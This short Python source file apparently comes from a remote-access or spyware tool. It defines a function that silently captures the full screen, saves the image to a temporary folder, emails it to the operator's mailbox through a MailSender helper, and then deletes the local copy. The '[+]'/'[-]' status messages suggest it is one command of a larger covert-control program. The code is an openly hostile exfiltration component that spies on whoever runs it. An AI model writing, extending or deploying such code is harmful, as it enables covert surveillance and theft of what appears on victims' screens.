from PIL import ImageGrab
import tempfile
import shutil
from MailSender import *


def takeSreenshot(email, passwd):
    try:
        dirpath = tempfile.mkdtemp()  # create a temp dir to store our screenshot file
        ImageGrab.grab().save(dirpath + "\img.jpg", "JPEG")  # save screenshot
        file = {'file': open(dirpath + "\img.jpg", 'rb')}
        attach_ImageFile(email, passwd, dirpath + "\img.jpg")
        shutil.rmtree(dirpath)
        return "[+] Send a screenshot file to your mail..."
    except:
        return "[-] Error when take a screenshot..."
